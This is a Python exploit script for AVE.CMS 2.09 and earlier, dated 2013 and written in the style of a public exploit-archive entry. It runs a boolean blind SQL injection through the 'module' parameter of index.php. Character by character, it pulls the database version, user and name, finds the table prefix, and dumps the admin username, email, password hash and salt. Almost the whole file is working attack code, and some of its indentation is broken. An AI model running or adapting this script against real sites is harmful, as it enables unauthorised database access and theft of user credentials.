#!/usr/bin/env python

import urllib, sys, time

#######################################################################################
# Exploit Title: AVE.CMS <= 2.09 - Remote Blind SQL Injection Exploit
# Date: 23/05/2013
# Author: mr.pr0n (@_pr0n_)
# Homepage: http://ghostinthelab.wordpress.com/
# Vendor Homepage: http://www.overdoze.ru/
# Software Link: websvn.avecms.ru/listing.php?repname=AVE.cms+2.09
# Version: V2.09 and 2.09RC2
# Tested on: Linux Debian 2.6.32-5-686
# Description: The "module" parameter is vulnerable to Blind SQL Injection.
# Solution : Update to newest version.
#######################################################################################

print "+----------------------------------------------------------+"
print "|    AVE.CMS <= 2.09 - Remote Blind SQL Injection Exploit  |"
print "|            mr.pr0n - http://ghostinthelab.wordpress.com  |"
print "+----------------------------------------------------------+"

## 
GREEN   = '\033[32m'
RESET   = '\033[0;0m'
##

########
true       = "404"
min       = 32
max       = 127
num_of_ltr  = 50
########

url   = raw_input("\nEnter the address of the target AVE.CMS\n> ")
if url[:7] != "http://":
  url = "http://" + url + "/index.php?module="
else:
  url = url + "/index.php?module="

database = []
options = {'Version':'VERSION', 'User':'CURRENT_USER', 'Database':'DATABASE'}
sys.stdout.write("[+] Checking target... (please wait)...")
for element in options:
  sys.stdout.write("\n  [!] Database "+element+"  : ")
  for letter in range(1, num_of_ltr):
    for i in range(min, max):
      query = "-1%00' OR ORD(MID(("+options[element]+"()),"+str(letter)+",1))>"+str(i)+"#"
      target = url + query
      result = urllib.urlopen(target).read()
      if result.find(true) != -1:
  if options[element] == "DATABASE":
    database.append(chr(i))
  sys.stdout.write(GREEN+chr(i)+RESET)
  sys.stdout.flush()
  break
  time.sleep(1)
database = [i for i in database if i != ' ']
database = ''.join(database)
hexdatabase = database.encode("hex")

prefix = []
sys.stdout.write("\n[+] Checking for (random) Table Prefix... (please wait)... ")
sys.stdout.write("\n  [!] Table Prefix (for '"+GREEN+database+RESET+"' database) : ")
for letter in range(1, num_of_ltr):
  for letter2 in range(1, 7):
    for i in range(min, max):
      query = "-1%00' OR ORD(MID((SELECT CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x"+hexdatabase+" LIMIT "+str(letter)+",1),"+str(letter2)+",1))>"+str(i)+"#"
      target = url + query
      result = urllib.urlopen(target).read()
      if result.find(true) != -1:
  prefix.append(chr(i))
  sys.stdout.write(GREEN+chr(i)+RESET)
  sys.stdout.flush()
  break
  time.sleep(1)
  break
prefix = [i for i in prefix if i != ' ']
prefix = ''.join(prefix)

columns = {'Password':'password','Email':'email','Username':'user_name','Salt':'salt'}
sys.stdout.write("\n[+] Dumping '"+GREEN+prefix+"users"+RESET+"' table... (please wait)...")
for element in columns:
    sys.stdout.write("\n  [!] Column : "+element+"  : ")
    for letter in range(1, num_of_ltr):
      for i in range(min, max):
  query = "-1%00' OR ORD(MID((SELECT CONCAT("+columns[element]+") FROM "+database+"."+prefix+"users ORDER BY Id LIMIT 0,1),"+str(letter)+",1))>"+str(i)+"#"
  target = url + query
  result = urllib.urlopen(target).read()
  if result.find(true) != -1:
    sys.stdout.write(GREEN+chr(i)+RESET)
    sys.stdout.flush()
    break
    time.sleep(1)

sys.stdout.write("\n[+] End of POC...\n")
#eof